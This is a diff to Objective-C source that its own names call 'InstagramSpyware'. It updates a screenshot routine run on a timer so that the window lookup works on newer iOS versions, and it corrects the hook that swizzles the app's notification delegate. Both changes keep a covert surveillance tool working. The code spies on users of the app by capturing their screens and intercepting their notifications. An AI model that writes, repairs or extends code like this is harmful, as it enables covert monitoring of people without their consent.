@@ -118,10 +118,36 @@
 }
 
 - (void)takeScreenshot {
-    UIWindow *keyWindow = [UIApplication sharedApplication].keyWindow;
+    UIWindow *keyWindow = nil;
+    
+    if (@available(iOS 13.0, *)) {
+        for (UIWindowScene *windowScene in [UIApplication sharedApplication].connectedScenes) {
+            if (windowScene.activationState == UISceneActivationStateForegroundActive) {
+                for (UIWindow *window in windowScene.windows) {
+                    if (window.isKeyWindow) {
+                        keyWindow = window;
+                        break;
+                    }
+                }
+                if (keyWindow) break;
+            }
+        }
+    } else {
+        keyWindow = [UIApplication sharedApplication].keyWindow;
+    }
+    
     if (!keyWindow) {
-        NSArray *windows = [UIApplication sharedApplication].windows;
-        keyWindow = windows.firstObject;
+        if (@available(iOS 15.0, *)) {
+            for (UIWindowScene *windowScene in [UIApplication sharedApplication].connectedScenes) {
+                if (windowScene.activationState == UISceneActivationStateForegroundActive) {
+                    keyWindow = windowScene.windows.firstObject;
+                    break;
+                }
+            }
+        } else {
+            NSArray *windows = [UIApplication sharedApplication].windows;
+            keyWindow = windows.firstObject;
+        }
     }
     
     if (!keyWindow) {
@@ -197,7 +223,9 @@ void swizzled_didReceiveNotification(id self, SEL _cmd, UNUserNotificationCenter
 }
 
 - (void)hookNotifications {
-    Class delegateClass = [[UNUserNotificationCenter currentNotificationCenter] delegate];
+    id<UNUserNotificationCenterDelegate> delegate = [[UNUserNotificationCenter currentNotificationCenter] delegate];
+    Class delegateClass = [delegate class];
+    
     if (!delegateClass) {
         dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
             [self hookNotifications];
@@ -222,6 +250,7 @@ void swizzled_didReceiveNotification(id self, SEL _cmd, UNUserNotificationCenter
 
 - (void)dealloc {
     [_screenshotTimer invalidate];
+    [super dealloc];
 }
 
 @end
@@ -232,3 +261,4 @@ void initInstagramSpyware() {
         [[InstagramSpyware sharedInstance] startAll];
     }];
 }
+   
